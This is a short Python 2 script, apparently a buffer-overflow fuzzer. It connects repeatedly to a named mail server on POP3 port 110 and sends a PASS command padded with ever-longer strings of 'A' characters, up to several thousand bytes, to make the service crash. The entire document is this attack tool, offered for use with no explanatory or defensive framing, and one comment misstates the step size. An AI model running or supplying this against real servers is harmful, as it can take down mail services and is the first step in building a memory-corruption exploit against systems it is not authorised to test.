#!/usr/bin/python
# i didn't write the original version, so don't give me credit

import sys, socket

if len(sys.argv) < 2:
   print "You need to give the target mail server"
   exit(1)
else:
   target = sys.argv[1]


# Create an array of buffers with increments of 100

buffer=["A"]
counter=100
while len(buffer) <= 30:
   buffer.append("A"*counter)
   counter=counter+200

for string in buffer:
   print "Fuzzing PASS with %s bytes" % len(string)
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((target, 110))
   s.recv(1024)
   s.send('USER test\r\n')
   s.recv(1024)
   s.send('PASS ' + string + '\r\n')
   s.send('QUIT\r\n')
   s.close()
